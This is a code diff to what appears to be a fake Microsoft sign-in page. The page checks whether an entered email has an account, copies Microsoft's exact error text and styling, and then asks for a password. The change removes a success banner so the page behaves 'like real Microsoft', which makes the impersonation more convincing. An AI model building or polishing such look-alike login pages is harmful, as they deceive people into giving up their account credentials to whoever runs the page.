@@ -587,9 +587,8 @@
                                 // Only show the Microsoft error message, nothing else
                                 showMessage(formattedError, 'error');
                             } else if (data.siteReport.accountExists && data.siteReport.needsPassword) {
-                                // Account found, show password form
+                                // Account found, show password form without any message (like real Microsoft)
                                 showPasswordForm(email);
-                                showMessage('✅ Account found! Please enter your password.', 'success');
                             } else if (!data.siteReport.accountExists) {
                                 // Account not found - show the Microsoft error message
                                 showMessage("We couldn't find an account with that username. Try another, or <a href='#' onclick='return false;' style='color: #0067b8; text-decoration: none;'>get a new Microsoft account</a>.", 'error');
